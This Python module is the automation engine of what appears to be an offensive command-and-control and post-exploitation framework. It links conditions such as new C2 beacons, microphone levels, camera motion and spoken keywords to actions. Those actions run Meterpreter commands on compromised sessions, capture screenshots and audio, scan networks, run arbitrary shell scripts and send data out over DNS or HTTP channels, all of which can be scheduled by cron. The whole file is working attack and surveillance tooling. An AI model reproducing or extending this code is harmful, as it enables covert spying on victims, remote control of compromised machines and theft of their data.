"""
TriggerEngine — Module 22
Rule-based automation engine: IF condition THEN action.

Uses asyncio for scheduling; provides cron-based time triggers via
APScheduler (if installed) with fallback to asyncio task loops.
All I/O is async. DB access is synchronous via SQLAlchemy Session
(called in executor to keep async context clean).
"""
from __future__ import annotations

import asyncio
import json
import logging
import uuid
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)

# APScheduler is optional — graceful fallback
try:
    from apscheduler.schedulers.asyncio import AsyncIOScheduler
    from apscheduler.triggers.cron import CronTrigger as _CronTrigger
    _HAS_SCHEDULER = True
except ImportError:
    AsyncIOScheduler = None  # type: ignore
    _HAS_SCHEDULER = False
    logger.warning("[trigger_engine] apscheduler not installed — cron triggers disabled")


# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────

CONDITION_TYPES = [
    "audio_level",       # Microphone level > threshold
    "motion_detection",  # Camera motion detected
    "network_device",    # New device on network
    "keyword_detected",  # Keyword in audio/text
    "scheduled_time",    # Cron expression
    "file_changed",      # File modification
    "alert_created",     # New security alert
    "beacon_connected",  # New C2 beacon
]

ACTION_TYPES = [
    "take_snapshot",       # Camera snapshot
    "start_recording",     # Audio recording
    "send_alert",          # Create SOC alert
    "execute_c2_command",  # Run command on session
    "start_scan",          # Network/port scan
    "exfiltrate_data",     # Trigger exfiltration
    "send_notification",   # Push notification
    "run_script",          # Execute shell script
]


# ─────────────────────────────────────────────────────────────────────────────
# TriggerEngine
# ─────────────────────────────────────────────────────────────────────────────

class TriggerEngine:
    """
    Rule-based automation engine: IF condition THEN action.
    Persists triggers to DB, schedules cron-based ones via APScheduler.
    """

    _scheduler: Optional["AsyncIOScheduler"] = None
    _active_watchers: dict = {}        # trigger_id -> asyncio.Task
    _scheduler_jobs: dict = {}         # trigger_id -> apscheduler job_id

    # ── Scheduler lifecycle ───────────────────────────────────────────────────

    def _get_scheduler(self) -> Optional["AsyncIOScheduler"]:
        if not _HAS_SCHEDULER:
            return None
        if self._scheduler is None or not self._scheduler.running:
            self._scheduler = AsyncIOScheduler(timezone="UTC")
            self._scheduler.start()
        return self._scheduler

    # ── CRUD ──────────────────────────────────────────────────────────────────

    async def create_trigger(
        self,
        name: str,
        condition_type: str,
        condition: dict,
        action_type: str,
        action: dict,
        enabled: bool = True,
        db=None,
    ) -> str:
        """
        Create a new IF->THEN rule, persist to DB.
        Register with scheduler if condition_type == 'scheduled_time'.
        Returns trigger_id.
        """
        if condition_type not in CONDITION_TYPES:
            raise ValueError(f"Unknown condition_type: {condition_type}. Valid: {CONDITION_TYPES}")
        if action_type not in ACTION_TYPES:
            raise ValueError(f"Unknown action_type: {action_type}. Valid: {ACTION_TYPES}")

        trigger_id = str(uuid.uuid4())

        if db is not None:
            from database.models import AutoTrigger
            row = AutoTrigger(
                trigger_id=trigger_id,
                name=name,
                condition_type=condition_type,
                condition=condition,
                action_type=action_type,
                action=action,
                enabled=enabled,
                trigger_count=0,
                created_at=datetime.utcnow(),
            )
            db.add(row)
            db.commit()

        # Schedule if time-based
        if enabled and condition_type == "scheduled_time":
            cron_expr = condition.get("cron")
            if cron_expr:
                await self._schedule_cron_trigger(trigger_id, cron_expr, action_type, action)

        logger.info("[trigger_engine] Created trigger %s (%s -> %s)", trigger_id, condition_type, action_type)
        return trigger_id

    async def delete_trigger(self, trigger_id: str, db=None) -> bool:
        """Remove trigger from DB and cancel any scheduler job / watcher task."""
        # Cancel scheduler job
        if trigger_id in self._scheduler_jobs:
            sched = self._get_scheduler()
            if sched:
                try:
                    sched.remove_job(self._scheduler_jobs[trigger_id])
                except Exception:
                    pass
            del self._scheduler_jobs[trigger_id]

        # Cancel asyncio watcher
        if trigger_id in self._active_watchers:
            task: asyncio.Task = self._active_watchers[trigger_id]
            task.cancel()
            del self._active_watchers[trigger_id]

        if db is not None:
            from database.models import AutoTrigger
            row = db.query(AutoTrigger).filter(AutoTrigger.trigger_id == trigger_id).first()
            if row:
                db.delete(row)
                db.commit()
                return True
            return False
        return True

    async def list_triggers(self, db=None) -> list:
        """List all triggers with last_triggered and log_count."""
        if db is None:
            return []

        from database.models import AutoTrigger, TriggerLog
        rows = db.query(AutoTrigger).order_by(AutoTrigger.created_at.desc()).all()
        result = []
        for row in rows:
            log_count = (
                db.query(TriggerLog)
                .filter(TriggerLog.trigger_id == row.trigger_id)
                .count()
            )
            result.append({
                "trigger_id": row.trigger_id,
                "name": row.name,
                "condition_type": row.condition_type,
                "condition": row.condition,
                "action_type": row.action_type,
                "action": row.action,
                "enabled": row.enabled,
                "last_triggered": row.last_triggered.isoformat() if row.last_triggered else None,
                "trigger_count": row.trigger_count,
                "log_count": log_count,
                "created_at": row.created_at.isoformat() if row.created_at else None,
            })
        return result

    async def get_trigger(self, trigger_id: str, db=None) -> Optional[dict]:
        """Get a single trigger by ID."""
        if db is None:
            return None
        from database.models import AutoTrigger
        row = db.query(AutoTrigger).filter(AutoTrigger.trigger_id == trigger_id).first()
        if not row:
            return None
        return {
            "trigger_id": row.trigger_id,
            "name": row.name,
            "condition_type": row.condition_type,
            "condition": row.condition,
            "action_type": row.action_type,
            "action": row.action,
            "enabled": row.enabled,
            "last_triggered": row.last_triggered.isoformat() if row.last_triggered else None,
            "trigger_count": row.trigger_count,
            "created_at": row.created_at.isoformat() if row.created_at else None,
        }

    async def update_trigger(self, trigger_id: str, updates: dict, db=None) -> Optional[dict]:
        """Update mutable fields of a trigger."""
        if db is None:
            return None
        from database.models import AutoTrigger
        row = db.query(AutoTrigger).filter(AutoTrigger.trigger_id == trigger_id).first()
        if not row:
            return None

        allowed = {"name", "condition", "action", "enabled", "condition_type", "action_type"}
        for k, v in updates.items():
            if k in allowed:
                setattr(row, k, v)
        db.commit()

        # Re-register scheduler if enabled/cron changed
        if row.enabled and row.condition_type == "scheduled_time":
            cron_expr = row.condition.get("cron") if row.condition else None
            if cron_expr:
                await self._schedule_cron_trigger(trigger_id, cron_expr, row.action_type, row.action or {})

        return await self.get_trigger(trigger_id, db)

    async def toggle_trigger(self, trigger_id: str, db=None) -> dict:
        """Enable or disable a trigger. Returns new state."""
        if db is None:
            return {"error": "db required"}
        from database.models import AutoTrigger
        row = db.query(AutoTrigger).filter(AutoTrigger.trigger_id == trigger_id).first()
        if not row:
            return {"error": "not_found"}

        row.enabled = not row.enabled
        db.commit()

        if not row.enabled:
            # Cancel any running scheduler job
            if trigger_id in self._scheduler_jobs:
                sched = self._get_scheduler()
                if sched:
                    try:
                        sched.remove_job(self._scheduler_jobs[trigger_id])
                    except Exception:
                        pass
                del self._scheduler_jobs[trigger_id]
        else:
            # Re-activate cron if applicable
            if row.condition_type == "scheduled_time":
                cron_expr = (row.condition or {}).get("cron")
                if cron_expr:
                    await self._schedule_cron_trigger(
                        trigger_id, cron_expr, row.action_type, row.action or {}
                    )

        return {"trigger_id": trigger_id, "enabled": row.enabled}

    # ── Evaluation & execution ────────────────────────────────────────────────

    async def evaluate_trigger(
        self, trigger_id: str, event_data: dict, db=None
    ) -> bool:
        """
        Evaluate if the condition matches event_data.
        Execute the action if matched.
        Returns True if the trigger fired.
        """
        if db is None:
            return False
        from database.models import AutoTrigger
        row = db.query(AutoTrigger).filter(
            AutoTrigger.trigger_id == trigger_id,
            AutoTrigger.enabled == True,
        ).first()
        if not row:
            return False

        matched = self._evaluate_condition(
            row.condition_type, row.condition or {}, event_data
        )
        if not matched:
            return False

        # Execute action
        result = await self.execute_action(row.action_type, row.action or {})

        # Update stats
        row.last_triggered = datetime.utcnow()
        row.trigger_count = (row.trigger_count or 0) + 1
        db.commit()

        # Log
        await self._log_trigger(trigger_id, event_data, result, success=True, db=db)

        return True

    def _evaluate_condition(
        self, condition_type: str, condition: dict, event_data: dict
    ) -> bool:
        """Pure-logic condition evaluation."""
        if condition_type == "audio_level":
            threshold = condition.get("threshold", 50)
            level = event_data.get("audio_level", 0)
            return float(level) >= float(threshold)

        elif condition_type == "motion_detection":
            return bool(event_data.get("motion_detected", False))

        elif condition_type == "network_device":
            expected_mac = condition.get("mac_prefix", "")
            device_mac = event_data.get("mac", "")
            if expected_mac:
                return device_mac.lower().startswith(expected_mac.lower())
            return "new_device" in event_data

        elif condition_type == "keyword_detected":
            keywords = condition.get("keywords", [])
            text = str(event_data.get("text", "")).lower()
            return any(kw.lower() in text for kw in keywords)

        elif condition_type == "scheduled_time":
            # This is fired by the scheduler; always True here
            return True

        elif condition_type == "file_changed":
            watched_path = condition.get("path", "")
            changed_path = event_data.get("path", "")
            return watched_path and (watched_path in changed_path or changed_path == watched_path)

        elif condition_type == "alert_created":
            min_severity = condition.get("min_severity", "LOW")
            severity_rank = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
            event_sev = event_data.get("severity", "LOW")
            return severity_rank.get(event_sev, 0) >= severity_rank.get(min_severity, 0)

        elif condition_type == "beacon_connected":
            required_os = condition.get("os_type")
            event_os = event_data.get("os_type", "")
            if required_os:
                return event_os.lower() == required_os.lower()
            return True

        return False

    async def execute_action(self, action_type: str, action_params: dict) -> dict:
        """Execute a trigger action. Returns result dict."""
        logger.info("[trigger_engine] Executing action: %s params=%s", action_type, action_params)

        try:
            if action_type == "take_snapshot":
                return await self._action_take_snapshot(action_params)

            elif action_type == "start_recording":
                return await self._action_start_recording(action_params)

            elif action_type == "send_alert":
                return await self._action_send_alert(action_params)

            elif action_type == "execute_c2_command":
                return await self._action_execute_c2_command(action_params)

            elif action_type == "start_scan":
                return await self._action_start_scan(action_params)

            elif action_type == "exfiltrate_data":
                return await self._action_exfiltrate_data(action_params)

            elif action_type == "send_notification":
                return await self._action_send_notification(action_params)

            elif action_type == "run_script":
                return await self._action_run_script(action_params)

            else:
                return {"error": f"Unknown action_type: {action_type}"}

        except Exception as exc:
            logger.error("[trigger_engine] execute_action %s failed: %s", action_type, exc)
            return {"error": str(exc), "action_type": action_type}

    # ── Action implementations ────────────────────────────────────────────────

    async def _action_take_snapshot(self, params: dict) -> dict:
        """Trigger a camera snapshot via PostExploitEngine."""
        from core.engines.post_exploit import PostExploitEngine
        eng = PostExploitEngine()
        session_id = params.get("session_id", "local")
        return await eng.screenshot_now(session_id)

    async def _action_start_recording(self, params: dict) -> dict:
        """Start an audio recording (stub — hooks into voice engine if available)."""
        duration = params.get("duration", 10)
        device = params.get("device", "default")
        return {
            "action": "start_recording",
            "duration": duration,
            "device": device,
            "status": "queued",
            "note": "Connect to voice engine to start real recording",
        }

    async def _action_send_alert(self, params: dict) -> dict:
        """Create a SOC alert."""
        try:
            from database.db import SessionLocal
            from database.models import Alert
            db = SessionLocal()
            try:
                alert = Alert(
                    severity=params.get("severity", "MEDIUM"),
                    category=params.get("category", "TRIGGER"),
                    title=params.get("title", "Automated Trigger Alert"),
                    description=params.get("description", "Fired by TriggerEngine"),
                    source_engine="trigger_engine",
                )
                db.add(alert)
                db.commit()
                alert_id = alert.id
            finally:
                db.close()
            return {"alert_created": True, "alert_id": alert_id}
        except Exception as exc:
            return {"alert_created": False, "error": str(exc)}

    async def _action_execute_c2_command(self, params: dict) -> dict:
        """Execute a command on a C2 session via Meterpreter."""
        from core.engines.post_exploit import _MsfRpc
        session_id = params.get("session_id", "1")
        command = params.get("command", "sysinfo")
        out, ok = await _MsfRpc.session_cmd(session_id, command)
        return {"output": out[:500], "success": ok, "command": command}

    async def _action_start_scan(self, params: dict) -> dict:
        """Trigger a network scan (Nmap)."""
        import shutil
        target = params.get("target", "127.0.0.1")
        nmap = shutil.which("nmap")
        if not nmap:
            return {"error": "nmap not found", "target": target}
        proc = await asyncio.create_subprocess_exec(
            nmap, "-sV", "--open", "-T3", target,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
            return {"output": stdout.decode("utf-8", errors="replace")[:1000], "target": target}
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return {"error": "scan timeout", "target": target}

    async def _action_exfiltrate_data(self, params: dict) -> dict:
        """Queue an exfiltration job."""
        from core.engines.exfil_engine import ExfilEngine
        eng = ExfilEngine()
        data_b64 = params.get("data_b64", "")
        channel = params.get("channel", "http")
        if not data_b64:
            return {"error": "no data_b64 provided"}
        data = __import__("base64").b64decode(data_b64)
        config = params.get("config", {})
        if channel == "dns":
            domain = config.get("domain", "example.com")
            return await eng.exfiltrate_dns(data, domain)
        elif channel == "http":
            endpoint = config.get("endpoint", "http://127.0.0.1/collect")
            return await eng.exfiltrate_http(data, endpoint)
        return {"error": f"channel '{channel}' not handled in trigger action"}

    async def _action_send_notification(self, params: dict) -> dict:
        """Log a notification (extend to push/email/Slack)."""
        message = params.get("message", "Trigger fired")
        logger.info("[trigger_engine] NOTIFICATION: %s", message)
        return {"notification": message, "sent_at": datetime.utcnow().isoformat()}

    async def _action_run_script(self, params: dict) -> dict:
        """Execute a shell script."""
        import shutil as _sh
        script = params.get("script", "")
        if not script:
            return {"error": "No script provided"}
        shell = _sh.which("bash") or _sh.which("sh")
        if not shell:
            return {"error": "No shell found"}
        proc = await asyncio.create_subprocess_exec(
            shell, "-c", script,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            return {
                "output": stdout.decode("utf-8", errors="replace")[:1000],
                "success": proc.returncode == 0,
            }
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return {"error": "script timeout"}

    # ── Logs ──────────────────────────────────────────────────────────────────

    async def _log_trigger(
        self,
        trigger_id: str,
        event_data: dict,
        action_result: dict,
        success: bool,
        db=None,
    ) -> None:
        if db is None:
            return
        from database.models import TriggerLog
        log = TriggerLog(
            trigger_id=trigger_id,
            event_data=event_data,
            action_result=action_result,
            success=success,
            triggered_at=datetime.utcnow(),
        )
        db.add(log)
        db.commit()

    async def get_trigger_logs(
        self, trigger_id: Optional[str] = None, limit: int = 50, db=None
    ) -> list:
        """Get execution history, optionally filtered by trigger_id."""
        if db is None:
            return []
        from database.models import TriggerLog
        q = db.query(TriggerLog).order_by(TriggerLog.triggered_at.desc())
        if trigger_id:
            q = q.filter(TriggerLog.trigger_id == trigger_id)
        rows = q.limit(limit).all()
        return [
            {
                "log_id": r.log_id,
                "trigger_id": r.trigger_id,
                "event_data": r.event_data,
                "action_result": r.action_result,
                "success": r.success,
                "triggered_at": r.triggered_at.isoformat() if r.triggered_at else None,
            }
            for r in rows
        ]

    async def test_trigger(self, trigger_id: str, db=None) -> dict:
        """Force-fire a trigger for testing with synthetic event data."""
        if db is None:
            return {"error": "db required"}
        from database.models import AutoTrigger
        row = db.query(AutoTrigger).filter(AutoTrigger.trigger_id == trigger_id).first()
        if not row:
            return {"error": "trigger not found"}

        # Synthetic event that satisfies any condition
        synthetic_event = {
            "audio_level": 100,
            "motion_detected": True,
            "new_device": True,
            "mac": "AA:BB:CC:DD:EE:FF",
            "text": " ".join(row.condition.get("keywords", ["test"]) if row.condition else ["test"]),
            "severity": "CRITICAL",
            "os_type": (row.condition or {}).get("os_type", "linux"),
            "path": (row.condition or {}).get("path", "/test"),
            "_test_mode": True,
        }

        result = await self.execute_action(row.action_type, row.action or {})

        row.last_triggered = datetime.utcnow()
        row.trigger_count = (row.trigger_count or 0) + 1
        db.commit()
        await self._log_trigger(trigger_id, synthetic_event, result, success=True, db=db)

        return {
            "trigger_id": trigger_id,
            "test_mode": True,
            "action_result": result,
            "fired_at": datetime.utcnow().isoformat(),
        }

    # ── Scheduler integration ─────────────────────────────────────────────────

    async def _schedule_cron_trigger(
        self,
        trigger_id: str,
        cron_expr: str,
        action_type: str,
        action_params: dict,
    ) -> None:
        """Register a cron-based trigger with APScheduler."""
        sched = self._get_scheduler()
        if sched is None:
            logger.warning("[trigger_engine] APScheduler unavailable; cron trigger %s not scheduled", trigger_id)
            return

        # Remove existing job if present
        if trigger_id in self._scheduler_jobs:
            try:
                sched.remove_job(self._scheduler_jobs[trigger_id])
            except Exception:
                pass

        # Parse cron expression (standard 5-field: min hour dom month dow)
        parts = cron_expr.strip().split()
        if len(parts) != 5:
            logger.error("[trigger_engine] Invalid cron expression: %s", cron_expr)
            return

        minute, hour, day, month, day_of_week = parts

        async def _cron_job():
            logger.info("[trigger_engine] Cron trigger %s fired", trigger_id)
            result = await self.execute_action(action_type, action_params)
            logger.info("[trigger_engine] Cron trigger %s result: %s", trigger_id, result)

        job = sched.add_job(
            _cron_job,
            _CronTrigger(
                minute=minute,
                hour=hour,
                day=day,
                month=month,
                day_of_week=day_of_week,
            ),
            id=f"trigger_{trigger_id}",
            replace_existing=True,
        )
        self._scheduler_jobs[trigger_id] = job.id
        logger.info("[trigger_engine] Scheduled cron trigger %s: %s", trigger_id, cron_expr)


# Module-level singleton
trigger_engine = TriggerEngine()
